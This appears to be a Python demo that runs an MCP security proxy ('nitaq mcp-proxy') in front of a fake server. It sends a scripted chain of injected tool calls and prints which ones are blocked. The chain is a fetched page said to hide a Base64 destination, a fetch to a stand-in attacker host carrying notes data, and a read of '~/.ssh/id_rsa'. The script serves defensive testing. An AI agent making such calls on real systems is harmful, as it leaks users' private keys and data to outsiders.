"""Talk to an MCP server through `nitaq mcp-proxy` and print what happens (demo only)."""
from __future__ import annotations

import json
import subprocess
import sys


def main(policy: str) -> int:
    name = "taint" if "taint" in policy else "demo"
    cmd = [sys.executable, "-m", "nitaq", "mcp-proxy", "--policy", policy, "--name", name, "--",
           sys.executable, "-m", "nitaq.testing.fake_mcp_server"]
    p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True, encoding="utf-8", bufsize=1)

    def ask(mid, method, params=None):
        p.stdin.write(json.dumps({"jsonrpc": "2.0", "id": mid, "method": method, "params": params or {}}) + "\n")
        p.stdin.flush()
        return json.loads(p.stdout.readline())

    ask(1, "initialize", {"protocolVersion": "2025-06-18", "capabilities": {}, "clientInfo": {"name": "demo"}})
    tools = [t["name"] for t in ask(2, "tools/list")["result"]["tools"]]
    print(f"client sees tools: {tools}")
    for i, (tool, args) in enumerate([
            ("read_note", {"title": "groceries"}),
            ("fetch_url", {"url": "https://news.example.test/page"}),          # page hides a destination (Base64)
            ("fetch_url", {"url": "https://collector.attacker.test.local/in?d=notes"}),
            ("read_note", {"title": "~/.ssh/id_rsa"}),
            ("format_table", {"rows": []})], start=3):
        r = ask(i, "tools/call", {"name": tool, "arguments": args})["result"]
        status = "BLOCKED" if r.get("isError") else "allowed"
        print(f"tools/call {tool}({json.dumps(args)}) -> {status}: {r['content'][0]['text'][:150]}")
    p.stdin.close()
    p.wait()
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1]))
